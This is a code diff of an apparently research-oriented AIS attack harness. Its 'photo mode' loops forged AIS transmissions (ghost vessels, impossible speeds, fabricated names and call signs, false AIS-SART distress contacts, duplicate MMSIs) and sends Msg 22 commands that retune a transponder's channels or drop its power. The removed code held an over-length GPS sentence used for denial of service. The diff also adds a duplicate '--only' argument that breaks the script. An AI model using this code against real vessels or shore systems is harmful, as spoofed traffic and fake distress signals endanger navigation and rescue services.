@@ -891,38 +891,57 @@ def build_matrix_segments(ctx):
     ]
 
 
-def build_photo(ctx):
-    """Photogenic attacks, each sustained for a couple of minutes so the display can be
-    photographed. RF steps drive the transponder over the air (target contacts); the one serial
-    step drives its GPS input to suppress own position. Each step prints a banner and holds."""
+def build_photos(ctx, photo_lat=None, photo_lon=None):
+    """Fresh photo set. Each entry: name -> (kind, payloads, banner).
+      kind 'loop'  -> a target injection re-sent forever so the contact stays on the display.
+      kind 'hold'  -> an M22 state change fired a few times, then held so the FRONT PANEL can be
+                      photographed (the unit keeps the changed state on its own).
+    RF payloads are (bits, meta) lists. For the ghost-based shots you can override the target
+    position with --photo-lat/--photo-lon (e.g. an on-land point); the default plots near own ship."""
     V = ctx.victim_mmsi
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
-    gp = offset_position(vlat, vlon, 45, 4000)     # ghost ~4 km NE of the victim
+    dg = offset_position(vlat, vlon, 45, 4000)         # default ghost ~4 km NE (plots near own ship)
+    glat = dg[0] if photo_lat is None else photo_lat
+    glon = dg[1] if photo_lon is None else photo_lon
     sp = offset_position(vlat, vlon, 90, 3000)
-    steps = []
-    # 1) impossible speed while not moving: fixed position, SOG 102.2 kn (max real value), named.
-    steps.append(("photo_impossible_speed", "rf",
-        [(enc.encode_type1(GHOST_A, gp[0], gp[1], sog=102.2, cog=90.0, nav_status=0),
-          "Type1 ghost, 102.2 kn, position held fixed"),
-         (enc.encode_type24_a(GHOST_A, shipname="GHOST VESSEL"),
-          "Type24 name for the ghost")],
-        "IMPOSSIBLE SPEED: a ghost reporting 102.2 kn while its position never changes"))
-    # 2) forged identity: fabricated name + call sign on a target.
-    steps.append(("photo_forged_identity", "rf",
-        [(enc.encode_type24_a(GHOST_A, shipname="NOT REAL NAME"), "Type24A forged name"),
-         (enc.encode_type24_b(GHOST_A, callsign="FAKE1", shiptype=70), "Type24B forged call sign"),
-         (enc.encode_type1(GHOST_A, gp[0], gp[1], sog=6.0, cog=270.0), "Type1 position for the identity")],
-        "FORGED IDENTITY: a contact with a fabricated name and call sign"))
-    # 3) false distress: 970-prefix (AIS-SART) contact with distress status.
-    steps.append(("photo_sart_distress", "rf",
-        [(enc.encode_type1(SAR_PREFIX, sp[0], sp[1], sog=0.0, nav_status=14),
-          "Type1 AIS-SART (970 prefix), distress status")],
-        "FALSE DISTRESS: an AIS-SART / locating-device contact where no emergency exists"))
-    # 4) traffic denial (serial): own position suppressed by an over-length sentence.
-    steps.append(("photo_dos_noposition", "serial",
-        ("$GPRMC,120000.00,A,4330.0000,N,07130.0000,W,0.0,90.0,180626,,,A," + "9" * 8000 + "\r\n").encode(),
-        "TRAFFIC DENIAL: own position suppressed by an over-length serial sentence"))
-    return steps
+    db = offset_position(vlat, vlon, 90, 9260)         # ~5 NM for the duplicate-identity shot
+    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement")
+    return {
+        "impossible_speed": ("loop",
+            [(enc.encode_type1(GHOST_A, glat, glon, sog=102.2, cog=90.0, nav_status=0),
+              "ghost 102.2 kn, position fixed"),
+             (enc.encode_type24_a(GHOST_A, shipname="GHOST VESSEL"), "name")],
+            "IMPOSSIBLE SPEED: ghost at 102.2 kn with a fixed position "
+            "(set --photo-lat/--photo-lon to an on-land point for the shot)"),
+        "forged_identity": ("loop",
+            [(enc.encode_type24_a(GHOST_A, shipname="NOT REAL NAME"), "M24-A forged name"),
+             (enc.encode_type24_b(GHOST_A, callsign="FAKE1", shiptype=70), "M24-B forged call sign"),
+             (enc.encode_type1(GHOST_A, glat, glon, sog=6.0, cog=270.0), "M1 position")],
+            "FORGED IDENTITY (Msg 24): name 'NOT REAL NAME', call sign 'FAKE1'"),
+        "ghost_vessel": ("loop",
+            [(enc.encode_type1(GHOST_A, glat, glon, sog=8.0, cog=270.0), "ghost position"),
+             (enc.encode_type24_a(GHOST_A, shipname="GHOST VESSEL"), "name")],
+            "GHOST VESSEL: a contact near own ship that does not exist"),
+        "sart_distress": ("loop",
+            [(enc.encode_type1(SAR_PREFIX, sp[0], sp[1], sog=0.0, nav_status=14),
+              "AIS-SART (970), distress nav-status 14")],
+            "FALSE DISTRESS: an AIS-SART locating-device contact, distress status"),
+        "duplicate_mmsi": ("loop",
+            [(enc.encode_type1(GHOST_DUP, vlat, vlon, sog=0.0), "MMSI at position A"),
+             (enc.encode_type1(GHOST_DUP, db[0], db[1], sog=0.0), "same MMSI ~5 NM away")],
+            "DUPLICATE IDENTITY: one MMSI shown at two incompatible positions"),
+        "m22_channel": ("hold",
+            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+                  f"M22 retune to {ALT_CH_A}/{ALT_CH_B}")],
+            f"CHANNEL CHANGE: front panel should read channels 84/85 ({ALT_CH_A}/{ALT_CH_B}). "
+            "Needs a CLEAN unit (factory reset first)."),
+        "m22_power": ("hold",
+            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=1),
+                  "M22 low power on default channels")],
+            "LOW POWER: front panel should read low / 1 W on channels 87/88. "
+            "Needs a CLEAN unit (factory reset first)."),
+    }
 
 
 def build_serial_extras(ctx):
@@ -1091,10 +1110,17 @@ def main():
     ap.add_argument("--clear-region-dwell", type=float, default=240.0,
                     help="seconds to hold the far position so the unit runs its regional-area "
                          "housekeeping and deletes the out-of-range area")
-    ap.add_argument("--photo", choices=["impossible_speed", "forged_identity",
-                                        "sart_distress", "dos_noposition"],
-                    help="play ONE photogenic attack in an infinite loop (Ctrl-C to stop) so the "
-                         "display can be photographed; restart with a different value for each shot")
+    ap.add_argument("--photo", choices=["impossible_speed", "forged_identity", "ghost_vessel",
+                                        "sart_distress", "duplicate_mmsi", "m22_channel", "m22_power"],
+                    help="hold ONE shot for the camera (Ctrl-C to stop, restart for the next). "
+                         "The target shots (ghost/speed/identity/distress/duplicate) loop forever so "
+                         "the contact stays up; the m22_ shots fire the command then hold the unit in "
+                         "the changed state so you photograph its FRONT PANEL (clean unit required).")
+    ap.add_argument("--photo-lat", type=float, default=None,
+                    help="override the ghost target latitude for a photo (e.g. an on-land point)")
+    ap.add_argument("--photo-lon", type=float, default=None,
+                    help="override the ghost target longitude for a photo")
+    ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--skip", nargs="+", default=[])
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
@@ -1201,29 +1227,37 @@ def main():
     try:
         # ---- photo mode: play ONE attack forever so the display can be photographed ----
         if args.photo:
-            steps = {n.replace("photo_", ""): (n, kind, payload, banner)
-                     for (n, kind, payload, banner) in build_photo(ctx)}
-            name, kind, payload, banner = steps[args.photo]
-            rec(event="photo_loop_start", name=name, kind=kind)
+            photos = build_photos(ctx, args.photo_lat, args.photo_lon)
+            kind, payloads, banner = photos[args.photo]
+            rec(event="photo_start", name=args.photo, kind=kind)
+            def _send_all():
+                for bits, meta in payloads:
+                    if all(c in "01" for c in bits):
+                        ws.send(bits)
             print("\n" + "=" * 66)
-            print(f"  PLAYING (infinite loop): {name}")
+            print(f"  PHOTO: {args.photo}")
             print(f"  >>> {banner}")
-            print("  >>> Photograph the display now. Press Ctrl-C to stop and restart")
-            print("  >>> with a different --photo value for the next shot.")
-            print("=" * 66 + "\n")
-            reps = 0
-            while True:
-                if kind == "rf":
-                    for bits, meta in payload:
-                        if all(c in "01" for c in bits):
-                            ws.send(bits)
+            print("=" * 66)
+            if kind == "loop":
+                print("  Looping the injection. Photograph the DISPLAY. Ctrl-C to stop.\n")
+                reps = 0
+                while True:
+                    _send_all()
                     time.sleep(args.accept_cadence)
-                else:
-                    gps.inject_raw(payload)
-                    time.sleep(0.5)
-                reps += 1
-                if reps % 30 == 0:
-                    print(f"    ...still playing '{args.photo}' ({reps} reps), Ctrl-C to stop")
+                    reps += 1
+                    if reps % 30 == 0:
+                        print(f"    ...still holding '{args.photo}' ({reps} reps), Ctrl-C to stop")
+            else:  # hold: fire the M22 state change, then hold for the front-panel shot
+                print("  Firing the command (needs a CLEAN unit)...")
+                for _ in range(6):
+                    _send_all()
+                    time.sleep(2)
+                print("  Applied. Photograph the FRONT PANEL now. Ctrl-C to stop.\n")
+                reps = 0
+                while True:
+                    time.sleep(10)
+                    reps += 1
+                    print(f"    ...holding '{args.photo}' ({reps*10}s), Ctrl-C to stop")
 
         if not (args.m20_only or args.phase2_only or args.phase3_only):
             for i, (name, payloads) in enumerate(timeline):
